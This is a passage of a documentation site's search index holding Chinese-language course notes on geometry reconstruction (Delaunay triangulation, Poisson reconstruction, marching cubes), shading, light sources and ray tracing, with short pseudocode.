1\\)\uff09\uff0c\u200b\u8be5\u9879\u200b\u5728\u200b \\(\\mathbf{M}\\) \u200b\u4e3a\u200b\u5355\u4f4d\u77e9\u9635\u200b \\(\\mathbf{I}\\) \u200b\u65f6\u200b\u53d6\u5f97\u200b\u6700\u5927\u503c\u200b \\(\\sum_{i} \\sigma_i\\)\u3002 $\\(\\text{Maximum is achieved when } \\mathbf{M} = \\mathbf{I}\\)$</p>"},{"location":"notes/VCI/Chapter%2010%20Geometry%20Reconstruction/#3-surface-reconstruction","title":"3. Surface Reconstruction","text":"<ul> <li>Directly: Triangulation (Delaunay Triangulation)</li> <li>Indirectly: Implicit Surfaces + Marching Cubes (Poisson Surface Reconstruction)</li> </ul>"},{"location":"notes/VCI/Chapter%2010%20Geometry%20Reconstruction/#31","title":"3.1 \u200b\u5fb7\u52b3\u5185\u200b\u4e09\u89d2\u200b\u5256\u5206","text":"<p>\u200b\u4e09\u89d2\u200b\u5256\u5206\u200b\u662f\u200b\u6307\u200b\u5c06\u200b\u70b9\u4e91\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u4e09\u89d2\u5f62\u200b\u7f51\u683c\u200b\u7684\u200b\u8fc7\u7a0b\u200b, \u200b\u5728\u200b\u7ed9\u200b\u5b9a\u70b9\u200b\u96c6\u4e0a\u200b\u6784\u9020\u200b\u4e09\u89d2\u5f62\u200b\u7f51\u683c\u200b\u6ca1\u6709\u200b\u552f\u4e00\u200b\u65b9\u6cd5\u200b. </p> <p>\u200b\u4f46\u662f\u200b\u76f4\u89c9\u200b\u4e0a\u200b\u6765\u8bf4\u200b, \u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b\u751f\u6210\u200b\u51fa\u6765\u200b\u7684\u200b\u4e09\u89d2\u5f62\u200b\u5c3d\u91cf\u200b\"\u200b\u5747\u5300\u200b\", \u200b\u800c\u200b\u4e0d\u662f\u200b\u968f\u610f\u200b\u8fde\u63a5\u200b\u4e24\u4e2a\u200b\u70b9\u200b. \u200b\u5fb7\u52b3\u5185\u200b\u4e09\u89d2\u200b\u5256\u5206\u200b\u901a\u8fc7\u200b\u6700\u5927\u5316\u200b\u4e09\u89d2\u200b\u5256\u5206\u200b\u7ed3\u679c\u200b\u4e2d\u200b\u6700\u5c0f\u200b\u7684\u200b\u89d2\u200b, \u200b\u4f7f\u5f97\u200b\u4e09\u89d2\u5f62\u200b\u7f51\u683c\u200b\u5c3d\u91cf\u200b\u5747\u5300\u200b.</p> <p>\u200b\u4e25\u683c\u200b\u610f\u4e49\u200b\u4e0a\u200b\u6765\u8bf4\u200b\uff0c\u200b\u5fb7\u52b3\u5185\u200b\u4e09\u89d2\u200b\u5256\u5206\u200b\u5e76\u200b\u4e0d\u662f\u200b\u4e00\u79cd\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u800c\u662f\u200b\u6307\u200b\u4e00\u7c7b\u200b\u6ee1\u8db3\u200b\u4e86\u200b\u7279\u5b9a\u6761\u4ef6\u200b\u7684\u200b\u4e09\u89d2\u200b\u5256\u5206\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u6761\u4ef6\u200b\u5c31\u662f\u200b\uff1a\u200b\u751f\u6210\u200b\u7ed3\u679c\u200b\u4e2d\u200b\uff0c\u200b\u4efb\u4f55\u200b\u4e09\u89d2\u5f62\u200b\u7684\u200b\u5916\u63a5\u5706\u200b\u5185\u200b\uff0c\u200b\u90fd\u200b\u4e0d\u200b\u5305\u542b\u200b\u4efb\u4f55\u200b\u70b9\u200b\u3002\u200b\u53ef\u4ee5\u200b\u8bc1\u660e\u200b\uff0c\u200b\u8fd9\u6837\u200b\u7684\u200b\u4e09\u89d2\u200b\u5256\u5206\u200b\u6700\u5927\u5316\u200b\u4e86\u200b\u201c\u200b\u6240\u6709\u200b\u4e09\u89d2\u5f62\u200b\u4e2d\u200b\u6700\u5c0f\u200b\u7684\u200b\u5185\u89d2\u200b\u201d </p> <p></p>"},{"location":"notes/VCI/Chapter%2010%20Geometry%20Reconstruction/#32-poisson-surface-reconstruction","title":"3.2 Poisson Surface Reconstruction","text":"<p>\u200b\u8f93\u5165\u200b\u4e00\u4e9b\u200b\u5e26\u6cd5\u200b\u5411\u200b\u7684\u200b\u70b9\u200b \\(\\vec{V}\\), \u200b\u5b9a\u4e49\u200b\u6307\u793a\u200b\u51fd\u6570\u200b \\(\\chi_M\\) , \\(M\\) \u200b\u5185\u90e8\u200b\u7684\u200b\u70b9\u200b\u5177\u6709\u200b 1 \u200b\u7684\u200b\u51fd\u6570\u200b\u503c\u200b, \u200b\u5916\u90e8\u200b\u7684\u200b\u70b9\u200b\u5177\u6709\u200b 0 \u200b\u7684\u200b\u51fd\u6570\u200b\u503c\u200b, \u200b\u90a3\u4e48\u200b\u8be5\u200b\u6307\u6570\u51fd\u6570\u200b\u7684\u200b\u68af\u5ea6\u200b\u573a\u200b \\(\\nabla \\chi_M\\) \u200b\u5c31\u200b\u53ea\u200b\u5728\u200b \\(\\partial M\\) \u200b\u4e0a\u200b\u6709\u200b\u975e\u200b\u96f6\u200b\u68af\u5ea6\u200b. \u200b\u68af\u5ea6\u65b9\u5411\u200b\u4e0e\u200b\u6cd5\u200b\u5411\u91cf\u200b\u6b63\u597d\u200b\u53cd\u5411\u200b.  \u200b\u56e0\u6b64\u200b \\(\\vec{V}\\) \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u770b\u4f5c\u200b\u662f\u200b\u6307\u793a\u200b\u51fd\u6570\u200b\u68af\u5ea6\u200b\u573a\u200b\u5728\u200b\u8fb9\u754c\u200b\u7684\u200b\u91c7\u6837\u200b, \u200b\u95ee\u9898\u200b\u5c31\u200b\u8f6c\u5316\u200b\u4e3a\u200b\u5982\u4f55\u200b\u4ece\u200b\u68af\u5ea6\u200b\u573a\u200b\u6062\u590d\u200b\u51fa\u200b\u539f\u51fd\u6570\u200b, \u200b\u5373\u200b\u4ece\u200b\u4e0b\u5f0f\u200b\u4e2d\u200b\u4f30\u8ba1\u200b \\(\\chi_M\\): $$ \\nabla\\chi_M=\\vec{V} $$</p>"},{"location":"notes/VCI/Chapter%2010%20Geometry%20Reconstruction/#33-marching-cubes","title":"3.3 Marching Cubes","text":"<p>\u200b\u7ed9\u5b9a\u200b\u7b26\u53f7\u200b\u8ddd\u79bb\u200b\u573a\u200b\u51fd\u6570\u200b, \u200b\u91cd\u5efa\u200b\u9876\u70b9\u200b\u7f51\u683c\u200b. </p>"},{"location":"notes/VCI/Chapter%2012%20Shading/","title":"Chapter 12 Shading","text":"<p>\u200b\u901a\u8fc7\u200b\u7ed9\u200b\u51e0\u4f55\u4f53\u200b\u8868\u9762\u200b\u7740\u8272\u200b\u7684\u200b\u65b9\u5f0f\u200b\u4f7f\u5f97\u200b\u5b83\u200b\u770b\u8d77\u6765\u200b\u50cf\u200b\u6211\u4eec\u200b\u8bbe\u5b9a\u200b\u7684\u200b\u6750\u8d28\u200b\u7684\u200b\u8fc7\u7a0b\u200b. </p>"},{"location":"notes/VCI/Chapter%2012%20Shading/#1","title":"1. \u200b\u5149\u7167","text":"<p>\u200b\u8003\u8651\u200b\u6211\u4eec\u200b\u600e\u4e48\u200b\u770b\u5230\u200b\u4e00\u4e2a\u200b\u7269\u4f53\u200b\u7684\u200b: \u200b\u662f\u200b\u901a\u8fc7\u200b\u7269\u4f53\u200b\u8868\u9762\u200b\u53cd\u5c04\u200b\u7684\u200b\u5149\u7ebf\u200b\u8fdb\u5165\u200b\u6211\u4eec\u200b\u7684\u200b\u4eba\u773c\u200b. </p>"},{"location":"notes/VCI/Chapter%2012%20Shading/#11","title":"1.1 \u200b\u5149\u6e90","text":"<p>\u200b\u5e38\u89c1\u200b\u7684\u200b\u5149\u6e90\u200b: - \u200b\u5e73\u884c\u200b\u5149\u200b, \u200b\u65b9\u5411\u200b \\(\\vec{d}\\), \u200b\u5f3a\u5ea6\u200b \\(I_d\\) \u200b\u5b9a\u4e49\u200b\u4e3a\u200b\u5782\u76f4\u4e8e\u200b\u5149\u200b\u5165\u5c04\u200b\u65b9\u5411\u200b\u5355\u4f4d\u200b\u9762\u79ef\u200b\u4e0a\u200b\u63a5\u6536\u200b\u5230\u200b\u7684\u200b\u5149\u200b\u7167\u5c04\u200b\u7684\u200b\u529f\u7387\u200b.    \u200b\u53f3\u8fb9\u200b\u8868\u9762\u200b\u63a5\u6536\u200b\u5230\u200b\u7684\u200b\u5149\u5f3a\u200b\u5e94\u8be5\u200b\u662f\u200b\u5de6\u8fb9\u200b\u7684\u200b \\(\\cos \\theta\\) \u200b\u500d\u200b. - \u200b\u73af\u5883\u5149\u200b, \u200b\u53ef\u4ee5\u200b\u7406\u89e3\u200b\u4e3a\u200b\u6765\u81ea\u200b\u56db\u9762\u516b\u65b9\u200b\u7684\u200b\u5149\u200b\u7efc\u5408\u200b\u540e\u200b\u5f97\u5230\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5404\u4e2a\u200b\u65b9\u5411\u200b\u5747\u7b49\u200b\u7684\u200b\u5149\u200b. \u200b\u5149\u5f3a\u200b \\(I_a\\) - \u200b\u70b9\u5149\u6e90\u200b, \u200b\u5f3a\u5ea6\u200b\u968f\u7740\u200b\u8ddd\u79bb\u200b\u8870\u51cf\u200b, \u200b\u5149\u5f3a\u200b\\(I_p/r^2\\)</p>"},{"location":"notes/VCI/Chapter%2012%20Shading/#12","title":"1.2 \u200b\u53cd\u5c04\u200b\u6a21\u578b","text":"<p>\u200b\u6f2b\u53cd\u5c04\u200b: \u200b\u955c\u9762\u53cd\u5c04\u200b: Blinn-Phong \u200b\u53cd\u5c04\u200b\u6a21\u578b\u200b </p>"},{"location":"notes/VCI/Ray%20Tracing/","title":"Ray Tracing","text":""},{"location":"notes/VCI/Ray%20Tracing/#11-recap-ray-tracing","title":"1.1 Recap: Ray Tracing","text":"<p>Forward: \u200b\u4ece\u200b\u5149\u6e90\u200b\u51fa\u53d1\u200b\uff0c\u200b\u8ffd\u8e2a\u200b\u5149\u7ebf\u200b\u6253\u200b\u5230\u200b\u773c\u775b\u200b\u3002\uff08\u200b\u4f4e\u6548\u200b\uff0c\u200b\u53ef\u80fd\u200b\u5f88\u591a\u200b\u5149\u200b\u6ca1\u6709\u200b\u8fdb\u5165\u200b\u773c\u775b\u200b\uff09 Backward: \u200b\u4ece\u200b\u773c\u775b\u200b\u51fa\u53d1\u200b\uff0c\u200b\u8ffd\u8e2a\u200b\u6253\u200b\u5230\u200b\u5149\u6e90\u200b\u7684\u200b\u5149\u7ebf\u200b\u3002</p> <ul> <li>When ray hits a surface we perfrom shading:<ul> <li>\"shading\" determines what color you observe (along the way)</li> </ul> </li> </ul> C++<pre><code>#include &lt;iostream&gt;\nusing namespace std;\nint main() {\n    return 0;\n}\n</code></pre> Text Only<pre><code>for each pixel:\n    ray = camera.getRay(pixel);\n    c = scene.trace(ray, 0, +inf);\n    image.set(pixel, c);\n\nScene::trace(ray, tMin, tMax):\n    hit = surfaces.intersect(ray, tMin, tMax);\n    if (hit)\n        return hit.color();\n    else \n        return backgroundColor;\n</code></pre> <p>The reflection equation</p> <p>Reflected radiance is a (hemi)spherical integral of incident radiance from all directions</p> <p>BRDF(Bidirectional reflectance distribution function)</p>"}]}